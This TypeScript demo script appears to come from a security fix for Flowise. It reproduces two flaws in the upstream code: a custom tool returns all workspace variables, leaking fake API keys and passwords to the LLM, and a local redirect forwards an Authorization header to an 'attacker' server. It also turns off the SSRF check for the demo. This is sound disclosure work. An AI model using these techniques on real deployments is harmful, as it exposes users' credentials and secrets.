/**
 * demo/run-before.ts
 *
 * Demonstrates the BEFORE state — using ORIGINAL upstream Flowise code.
 * The upstream snapshot is demo/legacy/httpSecurity.upstream.ts
 * (verbatim copy of packages/components/src/httpSecurity.ts at commit 9291856d).
 *
 * Attack 1: $vars exfiltration via tool output
 *   A Custom Tool with no secretBindings receives $vars in scope.
 *   The tool returns JSON.stringify($vars) — the LLM receives every
 *   workspace variable in plain text.
 *
 * Attack 2: Redirect credential forwarding (upstream code, NO header stripping)
 *   The sandbox sends a request to Server A (127.0.0.1:4001) with an
 *   Authorization header.  Server A redirects to Server B (127.0.0.1:4002).
 *   The upstream secureAxiosRequest has NO cross-origin header-stripping logic,
 *   so Authorization is forwarded to Server B verbatim.
 *   (Our fixed code in httpSecurity.ts strips it — that is the whole point.)
 *
 * Hard internal timeout: 30 s (process.exit(2) + "TIMEOUT" message).
 */

// ── Hard timeout: kills the process after 30 s ────────────────────────────────
const hardTimeout = setTimeout(() => {
    console.error('TIMEOUT: demo/run-before.ts exceeded 30 s')
    process.exit(2)
}, 30_000)
hardTimeout.unref() // don't let this timer itself prevent exit

// ── Allow localhost / private IPs for demo (bypass SSRF deny-list) ────────────
process.env.HTTP_SECURITY_CHECK = 'false'

import * as http from 'http'
// Attack 2 deliberately uses the UPSTREAM snapshot, not our fixed code.
import { secureAxiosRequest as upstreamSecureAxiosRequest } from './legacy/httpSecurity.upstream'
import { prepareSandboxVars } from '../packages/components/src/utils'
import { redact } from '../packages/components/src/guardRedact'

const UPSTREAM_COMMIT = '9291856d'

// ── Fake secrets built at runtime ─────────────────────────────────────────────
const FAKE_OPENAI_KEY = 'sk-' + 'a'.repeat(24)
const FAKE_DB_PASS = ['my', 'db', 'password', 'xyz', '99999'].join('-')

/** Mask a secret for display: show first 4 chars + *** */
function maskSecret(s: string): string {
    return s.slice(0, 4) + '***'
}

// ── Mock workspace variables (what $vars would contain) ──────────────────────
const mockVars = [
    { name: 'OPENAI_API_KEY', value: FAKE_OPENAI_KEY, type: 'static' as const },
    { name: 'DB_PASSWORD', value: FAKE_DB_PASS, type: 'static' as const },
    { name: 'APP_NAME', value: 'my-flowise-app', type: 'static' as const }
]

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

function header(title: string) {
    console.log(`\n${'═'.repeat(60)}`)
    console.log(`  ${title}`)
    console.log('═'.repeat(60))
}

function subheader(title: string) {
    console.log(`\n── ${title} ──`)
}

// ─────────────────────────────────────────────────────────────────────────────
async function main() {
    header(`BEFORE: original upstream Flowise (commit ${UPSTREAM_COMMIT})`)

    // ── Attack 1: $vars returned directly by tool code ───────────────────────
    subheader('Attack 1 — tool code returns $vars directly')

    const $vars = prepareSandboxVars(mockVars)
    // Simulate: tool code is `return JSON.stringify($vars)`
    const toolOutput = JSON.stringify($vars)

    console.log('  Tool output (what LLM receives as ToolMessage):')
    console.log('  ' + toolOutput)
    console.log()
    console.log('  ⚠️  LLM sees OPENAI_API_KEY =', ($vars as any).OPENAI_API_KEY)
    console.log('  ⚠️  LLM sees DB_PASSWORD    =', ($vars as any).DB_PASSWORD)

    // Confirm redact() with empty resolvedSecrets does NOT catch a custom key
    const afterStaticOnly = redact(toolOutput, [])
    console.log()
    console.log('  After static-pattern redact(output, []) — what SSE trace shows without resolved secrets:')
    console.log('  ' + afterStaticOnly)
    console.log('  ⚠️  DB_PASSWORD still visible in SSE trace (no static pattern for it)')

    // ── Attack 2: redirect credential forwarding ──────────────────────────────
    subheader(`Attack 2 — Authorization header forwarded on redirect (upstream code, commit ${UPSTREAM_COMMIT})`)
    console.log('  Upstream secureAxiosRequest has NO cross-origin header-stripping logic.')
    console.log('  Request: GET http://127.0.0.1:4001/start  (Authorization: Bearer ' + maskSecret(FAKE_OPENAI_KEY) + ')')
    console.log('  Server A (4001) → 302 → Server B (4002, the "attacker")')
    console.log()

    const received: Record<string, string> = {}

    const srvB = http.createServer((req, res) => {
        Object.assign(received, req.headers)
        res.writeHead(200)
        res.end('ok')
    })

    await new Promise<void>((r) => srvB.listen(4002, '127.0.0.1', r))

    const srvA = http.createServer((_, res) => {
        res.writeHead(302, { location: 'http://127.0.0.1:4002/collect' })
        res.end()
    })

    await new Promise<void>((r) => srvA.listen(4001, '127.0.0.1', r))

    try {
        await upstreamSecureAxiosRequest({
            url: 'http://127.0.0.1:4001/start',
            method: 'GET',
            headers: { Authorization: `Bearer ${FAKE_OPENAI_KEY}` }
        })

        console.log('  Headers received by attacker server B (127.0.0.1:4002):')
        if (received.authorization) {
            // Show the real forwarded value — this is the attack, not a fake
            console.log('    authorization:', received.authorization)
            console.log()
            console.log('  ⚠️  CREDENTIAL FORWARDED — upstream code has no header-stripping on redirect')
        } else {
            // If somehow the header was not forwarded, report that honestly
            console.log('    authorization: (not received)')
            console.log()
            console.log('  NOTE: Authorization was NOT forwarded — upstream may have changed behaviour.')
            console.log('        This is unexpected; check the snapshot in demo/legacy/httpSecurity.upstream.ts.')
        }
    } finally {
        srvA.close()
        srvB.close()
    }

    header('END — BEFORE demo complete')
    console.log('  Run demo/after.sh to see the guarded behaviour.\n')
}

main()
    .catch((err) => {
        console.error(err)
        process.exit(1)
    })
    .finally(() => {
        clearTimeout(hardTimeout)
        process.exit(0)
    })
